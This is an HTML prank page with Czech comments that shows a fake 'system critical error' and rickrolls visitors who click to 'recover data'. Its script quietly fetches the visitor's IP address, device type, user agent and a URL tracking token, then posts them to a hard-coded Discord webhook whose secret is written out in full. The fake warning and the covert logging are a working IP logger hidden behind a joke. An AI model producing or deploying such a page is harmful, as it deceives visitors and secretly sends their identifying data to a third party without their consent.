<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <title>System Error</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; cursor: pointer; color: #ff4444; font-family: 'Courier New', Courier, monospace; }
        video { width: 100%; height: 100%; object-fit: cover; display: none; }
        #warning { text-align: center; border: 2px solid #ff4444; padding: 20px; background: rgba(255,0,0,0.1); }
    </style>
</head>
<body>

    <div id="warning">
        <h2>⚠️ SYSTEM CRITICAL ERROR ⚠️</h2>
        <p>Your session has been corrupted.</p>
        <p>[ CLICK TO RECOVER DATA ]</p>
    </div>

    <video id="rickroll" loop>
        <source src="https://github.com/ShatteredDisk/rickroll/raw/refs/heads/main/rickroll.mp4" type="video/mp4">
    </video>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1461819438948159601/1uQkuVDBbgrAtPCVvRnqDVjm1bGoOX12twRjQ9HALL4i4HEvyLbH4PuQlcMcs11_iE8P";

        async function sendLog(token) {
            try {
                // Získání IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // Detekce zařízení
                const device = navigator.userAgent.includes("Mobi") ? "Mobil" : "PC/Tablet";

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "✅ Rickroll Successful",
                            color: 15548997,
                            fields: [
                                { name: "Uživatel (Token)", value: `\`${token}\``, inline: true },
                                { name: "Zařízení", value: `\`${device}\``, inline: true },
                                { name: "IP Adresa", value: `\`${ipData.ip}\``, inline: false },
                                { name: "User-Agent", value: `\`${navigator.userAgent}\`` }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { console.error("Log failed"); }
        }

        const video = document.getElementById('rickroll');
        const warning = document.getElementById('warning');

        document.body.addEventListener('click', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const token = urlParams.get('tkn') || "Neznámý";

            // Fullscreen trigger
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();

            // Zobrazení videa
            warning.style.display = 'none';
            video.style.display = 'block';
            video.play();

            // Odeslání reportu
            sendLog(token);
        }, { once: true });
    </script>
</body>
</html>
